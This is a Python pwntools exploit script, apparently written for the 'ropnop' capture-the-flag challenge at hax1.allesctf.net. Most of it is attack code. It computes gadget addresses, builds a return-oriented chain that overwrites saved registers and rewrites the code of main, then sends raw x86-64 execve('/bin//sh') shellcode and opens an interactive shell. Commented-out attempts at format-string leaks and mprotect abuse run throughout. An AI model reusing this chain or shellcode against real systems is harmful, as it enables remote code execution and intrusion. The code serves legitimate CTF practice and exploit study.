from pwn import *

# p = process("./ropnop")
p = remote("hax1.allesctf.net", 9300)

# we get the address space of the program from the printed output
# [defusing returns] start: 0x556668741000 - end: 0x556668742375
defuse_output = p.recv()
print(defuse_output.split(' '))
start_addr, end_addr = [int(s.strip(), 16) for s in defuse_output.split(' ') if s.startswith('0x')]

# 0x00000000000011e4 : syscall
# 0x00000000000011e7 : pop rax ; ret
# 0x00000000000011e9 : pop rdi ; ret
# 0x00000000000011eb : pop rsi ; ret
# 0x00000000000011ed : pop rdx ; ret

MAIN_START = start_addr + 0x12a0
MAIN_RET = MAIN_START + 0x41
MPROTECT = start_addr + 0x124e
MPROTECT_PLT = start_addr + 0x1060
CALL_PRINTF = start_addr + 0x122f
ROPNOP_START = start_addr + 0x1200
SET_RDI_ROPNOP = start_addr + 0x1208
PRINTF_PLT = start_addr + 0x1030
PRINTF_GOT = start_addr + 0x4018

POP_RDI_RET = start_addr + 0x1353
POP_RBP_RET = POP_RDI_RET - 0xb9 
FORMAT_STRING = start_addr + 0x2004

# gadgets
GADGET_SHOP = start_addr + 0x11e0
SYSCALL = start_addr + 0x11e4
POP_RAX = start_addr + 0x11e7
POP_RDI = start_addr + 0x11e9
POP_RSI = start_addr + 0x11eb
POP_RDX = start_addr + 0x11ed
POP_RSI_R15_RET = start_addr + 0x1351
# two ret gadgets are left untouched by the transform
# 0x0000000000001121 : retf 0x2e
# 0x0000000000001062 : retf 0x2f

EXECVE_CODE = 0x3b

# TODO: try writing more characters here and see if we can overwrite past the stack because of the mprotect

# TODO: format string exploit can write to arbitrary memory using %3$ to addrress stack and %n to write printed chars
# TODO: maybe abuse mprotect to make stack writeable instead of using write format string exploit
# TODO: we need to leak either stack address or libc address anyway

# With the buffer overflow we overwrite the following registers:
# RSI  0x7ffc96dc72a0  0x6161616261616161 ('aaaabaaa')
# R13  0x7ffc96dc7390  0x6361616c6361616b ('kaaclaac')
# RSP  0x7ffc96dc72b8  0x6161616861616167 ('gaaahaaa')
# RBP eaaafaaa

# RAX  0x0
# RBX  0x0
# RCX  0x0
# RDX  0x1337
# RDI  0x0
# A lot of room to write on the stack, varies from execution to execution

# pointer on stack to the stack? 
# 0x7ffd2dbec738 -> 0x7ffd2dbec70a <- 0x5858585858585858 ('XXXXXXXX')

# When we call printf we have RDI as format string and RSI as varargs
# RDI  0x555555556004  '[defusing returns] start: %p - end: %p\n'
# RSI  0x555555554000  0x10102464c457f

# I need to set RDI to a string I control or the existing format string
# If I can controll RDI I could call system execve directly ? need rax to put the code

exploit = "A" * cyclic_find("eaaa") # padding / RSI

# we set RBP to a blank memory area in the executable to reset start and end to zero in ropnop
exploit += p64(start_addr+0xd0) 

# we pop RSI to point to the GOT entry for printf, to leak a libc address
# exploit += p64(POP_RSI_R15_RET)
# exploit += p64(PRINTF_GOT)
# exploit += p64(PRINTF_GOT) # put some junk in r15

# [defusing returns] start: 0x556668741000 - end: 0x556668742375
# +12 = turns] start: %p - end: %p


# exploit += p64(POP_RAX) # pop rax and go through the madness
# exploit += p64(0) # rdi
# exploit += p64(0) # rsi
# exploit += p64(0) # rdx
# exploit += p64(0) # rbp
# exploit += p64(11)
# exploit += p64(POP_RSI_R15_RET) # return to here from ropnop, pop the format string in rdi
# exploit += p64(PRINTF_GOT) # match RBP - 16 
# exploit += p64(0) # put some junk in r15

# or just call printf with the format string?
# 

# stack offset -> end - 0x2430; start + 0x1ebd0

# we leak RSI (stack addess) and a libc addess through GOT/RDX
# the program crashes trying to write to libc because of RBP
# exploit += p64(ROPNOP_START+34) 
# we can set RBP to the PLT so that it points to the memory of the program - doesn't work points to an offset?

exploit += p64(POP_RDI_RET)
exploit += p64(FORMAT_STRING)
exploit += p64(ROPNOP_START+47)
exploit += p64(0) * 4 # clear ropnop
# exploit += p64(POP_RBP_RET)
# exploit += p64(FORMAT_STRING)
exploit += p64(MAIN_START+16) # new RBP, we write to start of main
exploit += p64(MAIN_START+25)
exploit += p64(0) * 4 # clear main
exploit += p64(MAIN_START) # new RBP
exploit += p64(MAIN_START) # fingers crossed :|

# raw_input('attach gdb')
p.sendline(exploit)

defuse_output2 = p.recv()
# write shellcode here, then when execution resumes we win
# shellcode!
p.sendline("\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05")
p.interactive()

# jump to mprotect and use the arguments in read, if they don't get reset
# mprotect start addr / read offset == 0
# mprotect length / read buffer address == address of int* buffer 
# mprotect flags / read length == 0x1337 (ok because it ends in three 1 bytes)
# this should make the stack executable? checking in gdb doesn't look like it 
